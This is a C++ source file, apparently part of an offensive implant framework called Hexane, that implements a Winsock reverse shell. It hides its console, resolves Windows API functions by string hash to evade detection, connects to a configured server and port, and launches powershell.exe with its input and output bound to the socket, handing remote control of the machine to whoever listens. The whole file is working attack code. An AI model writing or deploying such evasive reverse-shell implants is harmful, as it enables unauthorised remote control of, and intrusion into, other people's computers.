#define WIN32_LEAN_AND_MEAN
#include "includes.hpp"
#include "Hexane.hpp"
#include "winsock2.h"
#define DEFAULT_BUFFLEN 1024
#define DEFAULT_SERVER "127.0.0.1"
#define DEFAULT_PORT 8443

using namespace Hexane::Memory;
using namespace Hexane::Cipher;
using namespace Hexane::Process;
using namespace Hexane::SystemChecks;

NTSTATUS StartConsoleApp() {

	// crappy, basic winsock shell (soon position independent), because idk what todo yet. Not OPSEC safe. Don't be an idiot
	// Not actually pic, obviously

	NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;
	SOCKET socket = INVALID_SOCKET;

	FreeConsole_t _FreeConsole = (FreeConsole_t)GetSymbolAddress(GetModuleAddress(GetHashFromString(STROBE("KERNEL32.DLL"), 12)), GetHashFromString(STROBE("FreeConsole"), 11));
	malloc_t _malloc = (malloc_t)GetSymbolAddress(GetModuleAddress(GetHashFromString(STROBE("ucrtbased.dll"), 13)), GetHashFromString(STROBE("malloc"), 6));

	_FreeConsole();
	PAPI api = (PAPI)_malloc(sizeof(API));

	ResolveSymbols(api);
	__timeout(MS_PER_SECOND * 3, *api);

	int start = -1;
	int retry = 0, maxRetry = 3;

	for (int i = 0; i < maxRetry; i++) {
		WSADATA version = {};
		if (start = api->_WSAStartup(MAKEWORD(2, 2), &version) != 0)
			return_defer(STATUS_WSASTARTUP_FAILED);

		socket = api->_WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (UINT)NULL, (UINT)NULL);
		if (socket == INVALID_SOCKET)
			return_defer(STATUS_WSASOCKET_FAILED);

		sockaddr_in server = {};
		server.sin_family = AF_INET;
		server.sin_addr.s_addr = api->_inet_addr(DEFAULT_SERVER);
		server.sin_port = api->_htons(DEFAULT_PORT);

		if (api->_WSAConnect(socket, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
			api->_closesocket(socket);
			api->_WSACleanup();

			retry++;
			if (retry == maxRetry)
				return_defer(STATUS_WSACONNECT_FAILED);

			api->_Sleep(1000);
			continue;
		}
		break;
	}

	char buffer[DEFAULT_BUFFLEN];
	api->_memset(buffer, 0, DEFAULT_BUFFLEN);

	retry = 0;
	for (int i = 0; i < maxRetry; i++) {
		if (api->_recv(socket, buffer, DEFAULT_BUFFLEN, 0) <= 0) {
			retry++;
			if (retry == maxRetry)
				return_defer(STATUS_SOCKET_RECV_FAILED);

			api->_Sleep(1000);
			continue;
		}
		break;
	}

	STARTUPINFO startup = {};
	PROCESS_INFORMATION procinfo = {};

	api->_memset(&startup, 0, sizeof(startup));
	startup.cb = sizeof(startup);
	startup.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	startup.hStdInput = startup.hStdOutput = startup.hStdError = (HANDLE)socket;

	if (!api->_CreateProcessA(NULL, STROBE("powershell.exe"), nullptr, nullptr, true, 0, nullptr, nullptr, &startup, &procinfo))
		return_defer(STATUS_PROCESS_CREATION_FAILED);

	ntstatus = api->_NtWaitForSingleObject(procinfo.hProcess, false, (PLARGE_INTEGER)INFINITE);
	if (!NT_SUCCESS(ntstatus)) 
		return_defer(ntstatus);

	api->_NtClose(procinfo.hProcess);
	api->_NtClose(procinfo.hThread);
	api->_memset(buffer, 0, sizeof(DEFAULT_BUFFLEN));

	return_defer(STATUS_SUCCESS);

defer:
	if (socket != INVALID_SOCKET) api->_closesocket(socket);
	if (start == 0) api->_WSACleanup();
	return ntstatus;
}

int main() {
	return (int) StartConsoleApp();
}